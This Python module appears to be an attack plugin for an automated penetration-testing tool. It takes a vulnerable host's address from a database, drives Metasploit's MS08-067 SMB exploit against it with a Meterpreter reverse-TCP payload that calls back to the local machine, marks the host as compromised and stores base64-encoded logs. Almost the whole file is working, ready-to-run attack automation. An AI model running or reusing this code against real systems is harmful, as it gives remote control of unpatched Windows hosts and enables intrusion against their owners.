from msf import exploit
import base64

def run(params):
    sql = "select hd.id, hd.ip_address, pd.port_number, v.details from host_data hd join port_data pd on hd.id = pd.host_data_id join vulnerabilities v on v.port_data_id = pd.id where v.id = %s"
    cursor = params.db.cursor()
    cursor.execute(sql, (params.item_identifier, ))
    row = cursor.fetchone()
    #print "exploit ms08-067 on host {0}".format(row[1])
    #params.log("exploit ms08-067 on host {0}".format(row[1]))
    cursor.close()
    
    setup = [
        "use exploit/windows/smb/ms08_067_netapi", 
        "set PAYLOAD windows/meterpreter/reverse_tcp", 
        "set RHOST {0}".format(row[1]),
        "set LHOST {0}".format(params.getLocalHost()),
        "set LPORT {0}".format(params.getOpenPort()),
        "exploit"
    ]
    
    log = ""
    result = exploit.runMsf(params, row[0], setup, "ms08_067")
    for l in result[1]:
        log = log + l + "\r\n"
        params.log(l)
        
    if result[0] == True:
        cursor = params.db.cursor()
        cursor.execute("update host_data set successful_info_gather = true where id = %s", (row[0], ))
        cursor.close()
    
    cursor = params.db.cursor()
    cursor.execute("insert into exploit_logs (host_data_id, vulnerability_description_id, log) values(%s, %s, %s)", (row[0], 1, base64.b64encode(log), ))
    cursor.close()
